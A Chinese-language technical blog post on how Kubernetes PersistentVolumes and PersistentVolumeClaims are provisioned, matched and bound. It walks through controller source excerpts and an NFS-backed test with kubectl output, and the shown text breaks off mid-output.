卷的供应有两种方式：静态供应或动态供应。\n静态供应 集群管理员创建若干 PV 卷。这些卷对象带有真实存储的细节信息，并且对集群 用户可用（可见）。PV 卷对象存在于 Kubernetes API 中，可供用户消费（使用）。\n动态供应 如果管理员所创建的所有静态 PV 卷都无法与用户的 PersistentVolumeClaim 匹配， 集群可以尝试为该 PVC 申领动态供应一个存储卷。 这一供应操作是基于 StorageClass 来实现的：PVC 申领必须请求某个 存储类，同时集群管理员必须 已经创建并配置了该类，这样动态供应卷的动作才会发生。 如果 PVC 申领指定存储类为 \u0026ldquo;\u0026quot;，则相当于为自身禁止使用动态供应的卷。\n为了基于存储类完成动态的存储供应，集群管理员需要在 API 服务器上启用 DefaultStorageClass 准入控制器。 举例而言，可以通过保证 DefaultStorageClass 出现在 API 服务器组件的 \u0026ndash;enable-admission-plugins 标志值中实现这点；该标志的值可以是逗号 分隔的有序列表。关于 API 服务器标志的更多信息，可以参考 kube-apiserver 文档。\n绑定 用户创建一个带有特定存储容量和特定访问模式需求的 PersistentVolumeClaim 对象； 在动态供应场景下，这个 PVC 对象可能已经创建完毕。 主控节点中的控制回路监测新的 PVC 对象，寻找与之匹配的 PV 卷（如果可能的话）， 并将二者绑定到一起。 如果为了新的 PVC 申领动态供应了 PV 卷，则控制回路总是将该 PV 卷绑定到这一 PVC 申领。 否则，用户总是能够获得他们所请求的资源，只是所获得的 PV 卷可能会超出所请求的配置。 一旦绑定关系建立，则 PersistentVolumeClaim 绑定就是排他性的，无论该 PVC 申领是 如何与 PV 卷建立的绑定关系。 PVC 申领与 PV 卷之间的绑定是一种一对一的映射，实现上使用 ClaimRef 来记述 PV 卷 与 PVC 申领间的双向绑定关系。\n如果找不到匹配的 PV 卷，PVC 申领会无限期地处于未绑定状态（即pvc处于pending状态）。 当与之匹配的 PV 卷可用时，PVC 申领会被绑定。 例如，即使某集群上供应了很多 50 Gi 大小的 PV 卷，也无法与请求 100 Gi 大小的存储的 PVC 匹配。当新的 100 Gi PV 卷被加入到集群时，该 PVC 才有可能被绑定。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  [root@node131 k8s_pv_pvc]# kubectl get pvc -A NAMESPACE NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE default nfs-pv-provisioning-demo Pending 7s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl describe pvc nfs-pv-provisioning-demo Name: nfs-pv-provisioning-demo Namespace: default StorageClass: Status: Pending Volume: Labels: demo=nfs-pv-provisioning Annotations: \u0026lt;none\u0026gt; Finalizers: [kubernetes.io/pvc-protection] Capacity: Access Modes: VolumeMode: Filesystem Used By: \u0026lt;none\u0026gt; Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal FailedBinding 5s (x3 over 27s) persistentvolume-controller no persistent volumes available for this claim and no storage class is set [root@node131 k8s_pv_pvc]#   使用 Pod 将 PVC 申领当做存储卷来使用。集群会检视 PVC 申领，找到所绑定的卷，并 为 Pod 挂载该卷。对于支持多种访问模式的卷，用户要在 Pod 中以卷的形式使用申领 时指定期望的访问模式。\n一旦用户有了申领对象并且该申领已经被绑定，则所绑定的 PV 卷在用户仍然需要它期间 一直属于该用户。用户通过在 Pod 的 volumes 块中包含 persistentVolumeClaim 节区来调度 Pod，访问所申领的 PV 卷。 相关细节可参阅使用申领作为卷。\n保护使用中的存储对象 保护使用中的存储对象（Storage Object in Use Protection）这一功能特性的目的 是确保仍被 Pod 使用的 PersistentVolumeClaim（PVC）对象及其所绑定的 PersistentVolume（PV）对象在系统中不会被删除，因为这样做可能会引起数据丢失。\n 说明： 当使用某 PVC 的 Pod 对象仍然存在时，认为该 PVC 仍被此 Pod 使用。 如果用户删除被某 Pod 使用的 PVC 对象，该 PVC 申领不会被立即移除。 PVC 对象的移除会被推迟，直至其不再被任何 Pod 使用。 此外，如果管理员删除已绑定到某 PVC 申领的 PV 卷，该 PV 卷也不会被立即移除。 PV 对象的移除也要推迟到该 PV 不再绑定到 PVC。\n 你可以看到当 PVC 的状态为 Terminating 且其 Finalizers 列表中包含 kubernetes.io/pvc-protection 时，PVC 对象是处于被保护状态的。\n每个 PV 对象都包含 spec 部分和 status 部分，分别对应卷的规约和状态。 PersistentVolume 对象的名称必须是合法的 DNS 子域名.\nPV说明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  apiVersion:v1kind:PersistentVolumemetadata:name:pv0003spec:capacity:storage:5GivolumeMode:FilesystemaccessModes:- ReadWriteOncepersistentVolumeReclaimPolicy:RecyclestorageClassName:slowmountOptions:- hard- nfsvers=4.1nfs:path:/tmpserver:192.168.182.131   说明： 在集群中使用持久卷存储通常需要一些特定于具体卷类型的辅助程序。 在这个例子中，PersistentVolume 是 NFS 类型的，因此需要辅助程序 /sbin/mount.nfs 来支持挂载 NFS 文件系统。\n 容量 一般而言，每个 PV 卷都有确定的存储容量。 容量属性是使用 PV 对象的 capacity 属性来设置的。 参考 Kubernetes 资源模型（Resource Model） 设计提案，了解 capacity 字段可以接受的单位。\n目前，存储大小是可以设置和请求的唯一资源。 未来可能会包含 IOPS、吞吐量等属性。\n卷模式 FEATURE STATE: Kubernetes v1.18 [stable] 针对 PV 持久卷，Kuberneretes 支持两种卷模式（volumeModes）：Filesystem（文件系统） 和 Block（块）。 volumeMode 是一个可选的 API 参数。 如果该参数被省略，默认的卷模式是 Filesystem。\nvolumeMode 属性设置为 Filesystem 的卷会被 Pod 挂载（Mount） 到某个目录。 如果卷的存储来自某块设备而该设备目前为空，Kuberneretes 会在第一次挂载卷之前 在设备上创建文件系统。\n你可以将 volumeMode 设置为 Block，以便将卷作为原始块设备来使用。 这类卷以块设备的方式交给 Pod 使用，其上没有任何文件系统。 这种模式对于为 Pod 提供一种使用最快可能方式来访问卷而言很有帮助，Pod 和 卷之间不存在文件系统层。另外，Pod 中运行的应用必须知道如何处理原始块设备。 关于如何在 Pod 中使用 volumeMode: Block 的卷，可参阅 原始块卷支持。\n访问模式 PersistentVolume 卷可以用资源提供者所支持的任何方式挂载到宿主系统上。 如下表所示，提供者（驱动）的能力不同，每个 PV 卷的访问模式都会设置为 对应卷所支持的模式值。 例如，NFS 可以支持多个读写客户，但是某个特定的 NFS PV 卷可能在服务器 上以只读的方式导出。每个 PV 卷都会获得自身的访问模式集合，描述的是 特定 PV 卷的能力。\n访问模式有：\n ReadWriteOnce \u0026ndash; 卷可以被一个节点以读写方式挂载； ReadOnlyMany \u0026ndash; 卷可以被多个节点以只读方式挂载； ReadWriteMany \u0026ndash; 卷可以被多个节点以读写方式挂载。  在命令行接口（CLI）中，访问模式也使用以下缩写形式：\n RWO - ReadWriteOnce ROX - ReadOnlyMany RWX - ReadWriteMany   重要提醒！ 每个卷只能同一时刻只能以一种访问模式挂载，即使该卷能够支持 多种访问模式。例如，一个 GCEPersistentDisk 卷可以被某节点以 ReadWriteOnce 模式挂载，或者被多个节点以 ReadOnlyMany 模式挂载，但不可以同时以两种模式 挂载。\n 类 每个 PV 可以属于某个类（Class），通过将其 storageClassName 属性设置为某个 StorageClass 的名称来指定。 特定类的 PV 卷只能绑定到请求该类存储卷的 PVC 申领。 未设置 storageClassName 的 PV 卷没有类设定，只能绑定到那些没有指定特定 存储类的 PVC 申领。\n早前，Kubernetes 使用注解 volume.beta.kubernetes.io/storage-class 而不是 storageClassName 属性。这一注解目前仍然起作用，不过在将来的 Kubernetes 发布版本中该注解会被彻底废弃。\n回收策略 目前的回收策略有：\n Retain \u0026ndash; 手动回收 Recycle \u0026ndash; 基本擦除 (rm -rf /thevolume/*) Delete \u0026ndash; 诸如 AWS EBS、GCE PD、Azure Disk 或 OpenStack Cinder 卷这类关联存储资产也被删除  目前，仅 NFS 和 HostPath 支持回收（Recycle）。 AWS EBS、GCE PD、Azure Disk 和 Cinder 卷都支持删除（Delete）。\n 回收策略 Retain 使得用户可以手动回收资源。当 PersistentVolumeClaim 对象 被删除时，PersistentVolume 卷仍然存在，对应的数据卷被视为\u0026quot;已释放（released）\u0026quot;。 由于卷上仍然存在这前一申领人的数据，该卷还不能用于其他申领。\n 测试Retain模式如下： 说明：Retain模式下，删除以前绑定pv的pvc后，再创建使用该pv的pvc，会导致该pvc一直pending。因为pv的Claim: default/nfs字段导致。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  [root@node131 ~]# [root@node131 ~]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Bound default/nfs 5h58m [root@node131 ~] [root@node131 k8s_pv_pvc]# kubectl delete -f nfs/nfs-pvc.yaml persistentvolumeclaim \u0026#34;nfs\u0026#34; deleted [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# [root@node131 ~]# [root@node131 ~]# [root@node131 ~]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Released default/nfs 6h1m [root@node131 ~]# [root@node131 k8s_pv_pvc]# kubectl create -f nfs/custom-nfs-pvc.yaml persistentvolumeclaim/nfs created [root@node131 k8s_pv_pvc]# [root@node131 ~]# [root@node131 ~]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Pending 8s [root@node131 ~]# [root@node131 ~]# [root@node131 ~]# kubectl describe pv Name: nfs Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Released Claim: default/nfs Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u0026lt;none\u0026gt; Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: 10.233.16.102 Path: /exports ReadOnly: false Events: \u0026lt;none\u0026gt;   节点亲和性 每个 PV 卷可以通过设置 节点亲和性 来定义一些约束，进而限制从哪些节点上可以访问此卷。 使用这些卷的 Pod 只会被调度到节点亲和性规则所选择的节点上执行。\n 说明： 对大多数类型的卷而言，你不需要设置节点亲和性字段。 AWS EBS、 GCE PD 和 Azure Disk 卷类型都能 自动设置相关字段。 你需要为 local 卷显式地设置 此属性\n PV的阶段 每个卷会处于以下阶段（Phase）之一：\n Available（可用）\u0026ndash; 卷是一个空闲资源，尚未绑定到任何申领； Bound（已绑定）\u0026ndash; 该卷已经绑定到某申领； Released（已释放）\u0026ndash; 所绑定的申领已被删除，但是资源尚未被集群回收； Failed（失败）\u0026ndash; 卷的自动回收操作失败。 命令行接口能够显示绑定到某 PV 卷的 PVC 对象  PVC说明 每个 PVC 对象都有 spec 和 status 部分，分别对应申领的规约和状态。 PersistentVolumeClaim 对象的名称必须是合法的 DNS 子域名.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  apiVersion:v1kind:PersistentVolumeClaimmetadata:name:myclaimspec:accessModes:- ReadWriteOncevolumeMode:Filesystemresources:requests:storage:8GistorageClassName:slowselector:matchLabels:release:\u0026#34;stable\u0026#34;matchExpressions:- {key: environment, operator: In, values:[dev]}  访问模式 申领在请求具有特定访问模式的存储时，使用与卷相同的访问模式约定。\n卷模式 申领使用与卷相同的约定来表明是将卷作为文件系统还是块设备来使用。\n资源 申领和 Pod 一样，也可以请求特定数量的资源。在这个上下文中，请求的资源是存储。 卷和申领都使用相同的 资源模型。\n选择算符 申领可以设置标签选择算符 来进一步过滤卷集合。只有标签与选择算符相匹配的卷能够绑定到申领上。 选择算符包含两个字段：\nmatchLabels - 卷必须包含带有此值的标签 matchExpressions - 通过设定键（key）、值列表和操作符（operator） 来构造的需求。合法的操作符有 In、NotIn、Exists 和 DoesNotExist。 来自 matchLabels 和 matchExpressions 的所有需求都按逻辑与的方式组合在一起。 这些需求都必须被满足才被视为匹配。\n类 申领可以通过为 storageClassName 属性设置 StorageClass 的名称来请求特定的存储类。 只有所请求的类的 PV 卷，即 storageClassName 值与 PVC 设置相同的 PV 卷， 才能绑定到 PVC 申领。\nPVC 申领不必一定要请求某个类。如果 PVC 的 storageClassName 属性值设置为 \u0026ldquo;\u0026quot;， 则被视为要请求的是没有设置存储类的 PV 卷，因此这一 PVC 申领只能绑定到未设置 存储类的 PV 卷（未设置注解或者注解值为 \u0026quot;\u0026rdquo; 的 PersistentVolume（PV）对象在系统中不会被删除，因为这样做可能会引起数据丢失。 未设置 storageClassName 的 PVC 与此大不相同，也会被集群作不同处理。 具体筛查方式取决于 DefaultStorageClass 准入控制器插件 是否被启用。\n 如果准入控制器插件被启用，则管理员可以设置一个默认的 StorageClass。 所有未设置 storageClassName 的 PVC 都只能绑定到隶属于默认存储类的 PV 卷。 设置默认 StorageClass 的工作是通过将对应 StorageClass 对象的注解 storageclass.kubernetes.io/is-default-class 赋值为 true 来完成的。 如果管理员未设置默认存储类，集群对 PVC 创建的处理方式与未启用准入控制器插件 时相同。如果设定的默认存储类不止一个，准入控制插件会禁止所有创建 PVC 操作。 如果准入控制器插件被关闭，则不存在默认 StorageClass 的说法。 所有未设置 storageClassName 的 PVC 都只能绑定到未设置存储类的 PV 卷。 在这种情况下，未设置 storageClassName 的 PVC 与 storageClassName 设置未 \u0026quot;\u0026rdquo; 的 PVC 的处理方式相同。  取决于安装方法，默认的 StorageClass 可能在集群安装期间由插件管理器（Addon Manager）部署到集群中。\n当某 PVC 除了请求 StorageClass 之外还设置了 selector，则这两种需求会按 逻辑与关系处理：只有隶属于所请求类且带有所请求标签的 PV 才能绑定到 PVC。\n 说明： 目前，设置了非空 selector 的 PVC 对象无法让集群为其动态供应 PV 卷。\n 早前，Kubernetes 使用注解 volume.beta.kubernetes.io/storage-class 而不是 storageClassName 属性。这一注解目前仍然起作用，不过在将来的 Kubernetes 发布版本中该注解会被彻底废弃。\n使用申领作为卷 Pod 将申领作为卷来使用，并藉此访问存储资源。 申领必须位于使用它的 Pod 所在的同一名字空间内。 集群在 Pod 的名字空间中查找申领，并使用它来获得申领所使用的 PV 卷。 之后，卷会被挂载到宿主上并挂载到 Pod 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  apiVersion:v1kind:Podmetadata:name:mypodspec:containers:- name:myfrontendimage:nginxvolumeMounts:- mountPath:\u0026#34;/var/www/html\u0026#34;name:mypdvolumes:- name:mypdpersistentVolumeClaim:claimName:myclaim  如上，业务pod使用了 pvc name为myclaim的pvc，做为卷存储，挂载到容器的/var/www/html\nPV和PVC设计目标 Kubernetes makes no guarantees at runtime that the underlying storage exists or is available. High availability is left to the storage provider.\nGoals\n Allow administrators to describe available storage.（通过pv来定义存储资源） Allow pod authors to discover and request persistent volumes to use with pods.（允许pod使用像使用pod的request资源一样使用存储pv） Enforce security through access control lists and securing storage to the same namespace as the pod volume.（通过访问控制列表机制来保证存储使用安全） Enforce quotas through admission control.（通过准入机制实现存储配额） Enforce scheduler rules by resource counting.（基于资源数量调度，调度pvc-\u0026gt;pv） Ensure developers can rely on storage being available without being closely bound to a particular disk, server, network, or storage device.(通过抽象层设计，pod与具体的存储资源隔离)  PersistentVolumeController分析 实例化 volume manager controller 来管理persistentvolume kubernetes\\pkg\\controller\\volume\\persistentvolume\\\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  // NewController creates a new PersistentVolume controller controller := \u0026amp;PersistentVolumeController{ volumes: newPersistentVolumeOrderedIndex(), claims: cache.NewStore(cache.DeletionHandlingMetaNamespaceKeyFunc), kubeClient: p.KubeClient, eventRecorder: eventRecorder, runningOperations: goroutinemap.NewGoRoutineMap(true /* exponentialBackOffOnError */), cloud: p.Cloud, enableDynamicProvisioning: p.EnableDynamicProvisioning, clusterName: p.ClusterName, createProvisionedPVRetryCount: createProvisionedPVRetryCount, createProvisionedPVInterval: createProvisionedPVInterval, claimQueue: workqueue.NewNamed(\u0026#34;claims\u0026#34;), volumeQueue: workqueue.NewNamed(\u0026#34;volumes\u0026#34;), resyncPeriod: p.SyncPeriod, operationTimestamps: metrics.NewOperationStartTimeCache(), }   pv cache 构造 newPersistentVolumeOrderedIndex -\u0026gt; persistentVolumeOrderedIndex pv在cache中按AccessModes索引，并按存储量大小排序\n1 2 3 4 5 6 7 8 9 10  // persistentVolumeOrderedIndex is a cache.Store that keeps persistent volumes // indexed by AccessModes and ordered by storage capacity. type persistentVolumeOrderedIndex struct { store cache.Indexer } func newPersistentVolumeOrderedIndex() persistentVolumeOrderedIndex { return persistentVolumeOrderedIndex{cache.NewIndexer(cache.MetaNamespaceKeyFunc, cache.Indexers{\u0026#34;accessmodes\u0026#34;: accessModesIndexFunc})} }   进行pv的同步操作\n 如果 volume.Spec.ClaimRef == nil 说明pv没有被pvc绑定使用，直接更新pv：ctrl.updateVolumePhase(volume, v1.VolumeAvailable, \u0026ldquo;\u0026quot;) volume.Spec.ClaimRef != nil 说明pv被pvc绑定使用，需要进行相应逻辑处理  说明：pvc和 pv 是通过UID来进行关联标识：claim.UID != volume.Spec.ClaimRef.UID ?\n1 2 3 4 5 6 7  // syncVolume is the main controller method to decide what to do with a volume. // It\u0026#39;s invoked by appropriate cache.Controller callbacks when a volume is // created, updated or periodically synced. We do not differentiate between // these events. func (ctrl *PersistentVolumeController) syncVolume(volume *v1.PersistentVolume) error { }   为pvc匹配查找最佳pv 根据声明的pvc，在pv列表中匹配查找\n 先按pvc要求的AccessModes，过滤出符合要求的pv候选列表 在pv候选列表中优选出最佳的pv  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  // findBestMatchForClaim is a convenience method that finds a volume by the claim\u0026#39;s AccessModes and requests for Storage func (pvIndex *persistentVolumeOrderedIndex) findBestMatchForClaim(claim *v1.PersistentVolumeClaim, delayBinding bool) (*v1.PersistentVolume, error) { return pvIndex.findByClaim(claim, delayBinding) } // find returns the nearest PV from the ordered list or nil if a match is not found func (pvIndex *persistentVolumeOrderedIndex) findByClaim(claim *v1.PersistentVolumeClaim, delayBinding bool) (*v1.PersistentVolume, error) { // PVs are indexed by their access modes to allow easier searching. Each  // index is the string representation of a set of access modes. There is a  // finite number of possible sets and PVs will only be indexed in one of  // them (whichever index matches the PV\u0026#39;s modes).  //  // A request for resources will always specify its desired access modes.  // Any matching PV must have at least that number of access modes, but it  // can have more. For example, a user asks for ReadWriteOnce but a GCEPD  // is available, which is ReadWriteOnce+ReadOnlyMany.  //  // Searches are performed against a set of access modes, so we can attempt  // not only the exact matching modes but also potential matches (the GCEPD  // example above).  allPossibleModes := pvIndex.allPossibleMatchingAccessModes(claim.Spec.AccessModes) for _, modes := range allPossibleModes { volumes, err := pvIndex.listByAccessModes(modes) if err != nil { return nil, err } bestVol, err := pvutil.FindMatchingVolume(claim, volumes, nil /* node for topology binding*/, nil /* exclusion map */, delayBinding) if err != nil { return nil, err } if bestVol != nil { return bestVol, nil } } return nil, nil }   优选算法函数如下，该函数会被PV controller 和 scheduler 使用\n 参数delayBinding 只在PV controller流程为true 参数node和excludedVolumes 只在scheduler流程设置  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // FindMatchingVolume goes through the list of volumes to find the best matching volume // for the claim. // // This function is used by both the PV controller and scheduler. // // delayBinding is true only in the PV controller path. When set, prebound PVs are still returned // as a match for the claim, but unbound PVs are skipped. // // node is set only in the scheduler path. When set, the PV node affinity is checked against // the node\u0026#39;s labels. // // excludedVolumes is only used in the scheduler path, and is needed for evaluating multiple // unbound PVCs for a single Pod at one time. As each PVC finds a matching PV, the chosen // PV needs to be excluded from future matching. func FindMatchingVolume( claim *v1.PersistentVolumeClaim, volumes []*v1.PersistentVolume, node *v1.Node, excludedVolumes map[string]*v1.PersistentVolume, delayBinding bool) (*v1.PersistentVolume, error) { }   Matching and binding PVC-\u0026gt;PV PersistentVolumeClaimBinder尝试查找与用户请求最接近的可用卷。如果存在，则通过将pv上的引用绑定到pvc。如果找不到合适的匹配，请求可能无法满足。\nclaim(PVC)必须请求访问模式和存储容量。这是因为内部PV是按其AccessModes索引的，目标PV在某种程度上是按其容量排序的。pvc声明可以请求以下多个属性中的一个来更好地匹配PV：卷名称、选择器和卷类(当前实现为注释)。\nPV可以定义一个ClaimRef，它会对PVC的匹配产生很大的影响(但不是绝对的保证)。PV还可以定义标签、注释和卷类(当前作为注释实现)以更好地针对目标PVC。\nPVC-\u0026gt;PV匹配算法说明：\nAs of Kubernetes version 1.4, the following algorithm describes in more details how a claim is matched to a PV:\n  Only PVs with accessModes equal to or greater than the claim\u0026rsquo;s requested accessModes are considered. \u0026ldquo;Greater\u0026rdquo; here means that the PV has defined more modes than needed by the claim, but it also defines the mode requested by the claim.\n  The potential PVs above are considered in order of the closest access mode match, with the best case being an exact match, and a worse case being more modes than requested by the claim.\n  Each PV above is processed. If the PV has a claimRef matching the claim, and the PV\u0026rsquo;s capacity is not less than the storage being requested by the claim then this PV will bind to the claim. Done.\n  Otherwise, if the PV has the \u0026ldquo;volume.alpha.kubernetes.io/storage-class\u0026rdquo; annotation defined then it is skipped and will be handled by Dynamic Provisioning.\n  Otherwise, if the PV has a claimRef defined, which can specify a different claim or simply be a placeholder, then the PV is skipped. 这点说明了 PV和PVC之间的关系是1对1\n  Otherwise, if the claim is using a selector but it does not match the PV\u0026rsquo;s labels (if any) then the PV is skipped. But, even if a claim has selectors which match a PV that does not guarantee a match since capacities may differ.\n  Otherwise, if the PV\u0026rsquo;s \u0026ldquo;volume.beta.kubernetes.io/storage-class\u0026rdquo; annotation (which is a placeholder for a volume class) does not match the claim\u0026rsquo;s annotation (same placeholder) then the PV is skipped. If the annotations for the PV and PVC are empty they are treated as being equal.\n  Otherwise, what remains is a list of PVs that may match the claim. Within this list of remaining PVs, the PV with the smallest capacity that is also equal to or greater than the claim\u0026rsquo;s requested storage is the matching PV and will be bound to the claim. Done. In the case of two or more PVCs matching all of the above criteria, the first PV (remember the PV order is based on accessModes) is the winner. 候选PV列表中最小资源满足的PV为最佳优选结果\n   Note: if no PV matches the claim and the claim defines a StorageClass (or a default StorageClass has been defined) then a volume will be dynamically provisioned.\n 测试NFS-PV-PVC 下面的示例演示如何从单个nfs server的POD RC控制器导出NFS共享，并将其导入web的两个RC控制器。\nnfs server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Copyright 2016 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.FROMcentosRUN yum -y install /usr/bin/ps nfs-utils \u0026amp;\u0026amp; yum clean allRUN mkdir -p /exportsADD run_nfs.sh /usr/local/bin/ADD index.html /tmp/index.htmlRUN chmod 644 /tmp/index.html# expose mountd 20048/tcp and nfsd 2049/tcp and rpcbind 111/tcpEXPOSE2049/tcp 20048/tcp 111/tcp 111/udpENTRYPOINT [\u0026#34;/usr/local/bin/run_nfs.sh\u0026#34;, \u0026#34;/exports\u0026#34;]  1 2 3 4  # 制作镜像 docker build -t k8s.gcr.io/volume-nfs:0.8 . docker save k8s.gcr.io/volume-nfs:0.8 -o volume-nfs-img.tar   1 2  # 在测试环境中导出镜像 docker load -i volume-nfs-img.tar   NFS server part  把nfs测试配置脚本文件examples/staging/volumes/nfs拷贝到测试环境中 修改下测试镜像名称：如busybox和nginx 按需要， 创建 gce-pv  1 2 3  # If you are on GCE, create a GCE PD-based PVC: # kubectl create -f examples/staging/volumes/nfs/provisioner/nfs-server-gce-pv.yaml # kubectl create -f nfs/provisioner/nfs-server-gce-pv.yaml   test pv和 pvc\n1 2 3 4 5  # test pv kubectl create -f nfs/test/pv0001.yaml # test pvc kubectl create -f nfs/test/pvc-pv0001.yaml    创建 NFS server and service  1 2 3 4  #kubectl create -f examples/staging/volumes/nfs/nfs-server-rc.yaml #kubectl create -f examples/staging/volumes/nfs/nfs-server-service.yaml kubectl create -f nfs/custom-nfs-server-rc.yaml kubectl create -f nfs/nfs-server-service.yaml   说明创建pod时，其使用的pvc必须为bound状态才能进行调度\n1 2 3 4 5 6 7 8  Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling 29s default-scheduler 0/1 nodes are available: 1 persistentvolumeclaim \u0026#34;nfs-pv-provisioning-demo\u0026#34; not found. Warning FailedScheduling 29s default-scheduler 0/1 nodes are available: 1 persistentvolumeclaim \u0026#34;nfs-pv-provisioning-demo\u0026#34; not found.    创建基于NFS的pv和pvc 检查下nfs-server  1 2 3  kubectl describe services nfs-server   nfs的服务端口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [root@node131 k8s_pv_pvc]# kubectl describe services nfs-server Name: nfs-server Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; Selector: role=nfs-server Type: ClusterIP IP Families: \u0026lt;none\u0026gt; IP: 10.233.63.192 IPs: 10.233.63.192 Port: nfs 2049/TCP TargetPort: 2049/TCP Endpoints: 10.233.124.46:2049 Port: mountd 20048/TCP TargetPort: 20048/TCP Endpoints: 10.233.124.46:20048 Port: rpcbind 111/TCP TargetPort: 111/TCP Endpoints: 10.233.124.46:111 Session Affinity: None Events: \u0026lt;none\u0026gt;   然后再创建nfs的pv和pvc\n1 2 3 4 5 6  #kubectl create -f examples/staging/volumes/nfs/nfs-pv.yaml #kubectl create -f examples/staging/volumes/nfs/nfs-pvc.yaml kubectl create -f nfs/custom-nfs-pv.yaml kubectl create -f nfs/custom-nfs-pvc.yaml   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  [root@node131 k8s_pv_pvc]# kubectl create -f nfs/nfs-pv.yaml persistentvolume/nfs created [root@node131 k8s_pv_pvc]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Available 6s [root@node131 k8s_pv_pvc]# kubectl describe pv nfs Name: nfs Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Available Claim: Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u0026lt;none\u0026gt; Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: nfs-server.default.svc.cluster.local Path: /tmp/data ReadOnly: false Events: \u0026lt;none\u0026gt; [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl create -f nfs/nfs-pvc.yaml persistentvolumeclaim/nfs created [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE nfs 1Mi RWX Retain Bound default/nfs 114s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound nfs 1Mi RWX 16s [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]#   此时再查看pv和pvc的信息，能够看到注解信息有变化，状态为Status: Bound\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  [root@node131 k8s_pv_pvc]# kubectl describe pv nfs Name: nfs Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pv-protection] StorageClass: Status: Bound Claim: default/nfs Reclaim Policy: Retain Access Modes: RWX VolumeMode: Filesystem Capacity: 1Mi Node Affinity: \u0026lt;none\u0026gt; Message: Source: Type: NFS (an NFS mount that lasts the lifetime of a pod) Server: nfs-server.default.svc.cluster.local Path: /tmp/data ReadOnly: false Events: \u0026lt;none\u0026gt; [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# [root@node131 k8s_pv_pvc]# kubectl describe pvc nfs Name: nfs Namespace: default StorageClass: Status: Bound Volume: nfs Labels: \u0026lt;none\u0026gt; Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: \u0026lt;none\u0026gt; Events: \u0026lt;none\u0026gt; [root@node131 k8s_pv_pvc]#    使用后端程序使用上面绑定好的nfs pvc，更新nfs的数据目录，即html页面  1 2 3  #kubectl create -f examples/staging/volumes/nfs/nfs-busybox-rc.yaml kubectl create -f nfs/custom-nfs-busybox-rc.yaml   其信息显示如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  [root@node131 nfs]# kubectl get po -A NAMESPACE NAME READY STATUS RESTARTS AGE default nfs-busybox-mntdb 1/1 Running 0 35s default nfs-busybox-r76ml 1/1 Running 0 35s default nfs-server-p6p4n 1/1 Running 1 134m kube-system 